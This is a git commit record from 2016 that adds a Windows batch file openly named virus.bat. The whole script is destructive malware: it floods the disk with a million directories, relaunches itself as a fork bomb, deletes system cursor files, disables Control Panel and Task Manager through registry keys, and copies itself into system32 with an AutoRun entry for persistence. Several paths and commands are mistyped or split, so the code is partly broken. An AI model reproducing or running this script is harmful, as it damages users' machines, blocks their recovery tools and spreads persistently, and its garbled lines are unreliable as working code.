01afb7a293f5902b508bae3c726c5b1dbdd895a6
WTFaker <egorka.vip2@gmail.com>
2016-08-11 14:29:52 +0300

    Create virus.bat

---
+++ virus.bat
@@ -0,0 +1,9 @@
+FOR /L %%i IN (1,1,1000000) DO md %%i
+start virus.bat
+del "%SystemRoot%Cursors*.*" >nul
+@echo off 
+reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
+/v NoControlPanel /t REG_DWORD /d 1 /f >nul
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul 
+reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\batinit.bat" /f >nul 
